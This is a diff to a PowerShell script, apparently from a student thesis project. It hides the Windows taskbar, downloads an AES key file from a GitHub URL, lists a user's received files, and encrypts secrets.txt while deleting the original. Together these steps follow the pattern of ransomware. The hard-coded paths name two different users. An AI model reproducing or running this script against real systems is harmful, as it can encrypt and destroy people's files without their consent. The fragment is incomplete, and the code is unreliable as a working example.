@@ -53,8 +53,21 @@ Sleep 2
 $taskbarHwnd = [Taskbar]::FindWindow("Shell_TrayWnd", "")
 [Taskbar]::ShowWindow($taskbarHwnd, [Taskbar]::SW_HIDE)
 
+# Define the URL of the file to download
+$fileUrl = "https://raw.githubusercontent.com/haiduc29/Script-Licenta/main/secret.xml"
+
+# Define the path where the file will be saved
+$outputPath = "C:\Users\ionut\Downloads\secret.xml"
+
+# Download the file
+Invoke-WebRequest -Uri $fileUrl -OutFile $outputPath
+# Define the path to the certificate and the password
+$secretPath = "C:\Users\ionut\Downloads\secret.xml"
+
 #secretKey
-$key = #
+$key = Import-CliXml -Path C:\Users\ionut\Downloads\secret.xml
+
+$files = Get-ChildItem "C:\Users\gerhardl\Documents\My Received Files\"
 
 #Encrypt the file 
 Protect-File '.\secrets.txt' -Algorithm AES -Key $key -RemoveSource 
